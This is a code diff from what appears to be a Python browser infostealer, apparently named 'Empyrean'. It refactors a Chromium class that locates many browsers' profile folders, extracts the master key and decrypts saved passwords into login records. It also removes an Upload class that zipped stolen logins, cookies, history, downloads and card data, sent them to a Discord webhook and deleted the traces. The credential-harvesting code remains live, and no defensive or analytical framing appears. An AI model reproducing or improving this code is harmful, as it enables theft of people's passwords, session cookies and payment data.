@@ -35,89 +35,23 @@ class Download(BaseModel):
 
 
 class Browsers:
-    def __init__(self) -> dict[str, Any]:
-        return Chromium()
-
-
-class Upload:
-    def __init__(self, webhook: SyncWebhook):
-        self.webhook = webhook
-
-        self.write_files()
-        self.send()
-        self.clean()
-
-    def write_files(self):
-        os.makedirs("vault", exist_ok=True)
-        if __LOGINS__:
-            with open("vault\\logins.txt", "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __LOGINS__))
-
-        if __COOKIES__:
-            with open("vault\\cookies.txt", "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __COOKIES__))
-
-        if __WEB_HISTORY__:
-            with open("vault\\web_history.txt", "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))
-
-        if __DOWNLOADS__:
-            with open("vault\\downloads.txt", "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __DOWNLOADS__))
-
-        if __CARDS__:
-            with open("vault\\cards.txt", "w", encoding="utf-8") as f:
-                f.write('\n'.join(str(x) for x in __CARDS__))
-
-        with ZipFile("vault.zip", "w") as zip:
-            for file in os.listdir("vault"):
-                zip.write(f"vault\\{file}", file)
-
-    def send(self):
-        self.webhook.send(
-            embed=Embed(
-                title="Vault",
-                description="```" +
-                '\n'.join(self.tree(Path("vault"))) + "```",
-            ),
-            file=File("vault.zip"),
-            username="Empyrean",
-            avatar_url="https://i.imgur.com/HjzfjfR.png"
-        )
-
-    def clean(self):
-        shutil.rmtree("vault")
-        os.remove("vault.zip")
-
-    def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
-        pipes = {
-            'space':  '    ',
-            'branch': '│   ',
-            'tee':    '├── ',
-            'last':   '└── ',
-        }
-
-        if prefix == '':
-            yield midfix_folder + path.name
-
-        contents = list(path.iterdir())
-        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
-        for pointer, path in zip(pointers, contents):
-            if path.is_dir():
-                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
-                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
-                yield from self.tree(path, prefix=prefix+extension)
-            else:
-                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
-
+    @classmethod
+    def run_module(cls) -> dict[str, Any]:
+        return Chromium().return_result()
 
 class Chromium:
-    def __init__(self) -> dict[str, Any]:
+    def return_result(self) -> dict[str, Any]:
+        return self.res
+    
+    def __init__(self) -> None:
+        self.res: dict[str, Any] = {}
+        
         self.appdata = os.getenv('LOCALAPPDATA')
         
         # If inaccessible, don't make assumptions and just quit immediately
         if not self.appdata:
-            return {}
+            self.res = {}
+            return
         
         self.browsers = {
             'amigo': self.appdata + '\\Amigo\\User Data',
@@ -145,8 +79,6 @@ class Chromium:
             'Profile 4',
             'Profile 5',
         ]
-        
-        res = {}
 
         for name, path in self.browsers.items():
             if not os.path.exists(path):
@@ -156,13 +88,13 @@ class Chromium:
             if not self.master_key:
                 continue
 
-            res[name] = {}
+            self.res[name] = {}
 
             for profile in self.profiles:
                 if not os.path.exists(path + '\\' + profile):
                     continue
                 
-                res[name][profile] = {}
+                self.res[name][profile] = {}
 
                 operations = {
                     "logins": self.get_login_data,
@@ -173,14 +105,12 @@ class Chromium:
 
                 for datatype, operation in operations.items():
                     try:
-                        res[name][profile][datatype] = operation(path, profile)
+                        self.res[name][profile][datatype] = operation(path, profile)
                     except Exception as e:
                         print(e)
                         pass
-                    
-        return res
 
-    def get_master_key(self, path: str) -> str | None:
+    def get_master_key(self, path: str) -> bytes | None:
         if not os.path.exists(path):
             return None
 
@@ -201,9 +131,9 @@ class Chromium:
         payload = buff[15:]
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
         decrypted_pass = cipher.decrypt(payload)
-        decrypted_pass = decrypted_pass[:-16].decode()
+        dec_pass = decrypted_pass[:-16].decode()
 
-        return decrypted_pass
+        return dec_pass
 
     def get_login_data(self, path: str, profile: str) -> list[dict]:
         res: list[dict] = []
@@ -220,7 +150,8 @@ class Chromium:
             if not row[0] or not row[1] or not row[2]:
                 continue
 
-            password = self.decrypt_password(bytes(row[2], 'utf-8'), self.master_key)
+            assert self.master_key is not None
+            password = self.decrypt_password(row[2], self.master_key)
             res.append(Login(url=row[0], username=row[1], password=password).model_dump())
 
         conn.close()
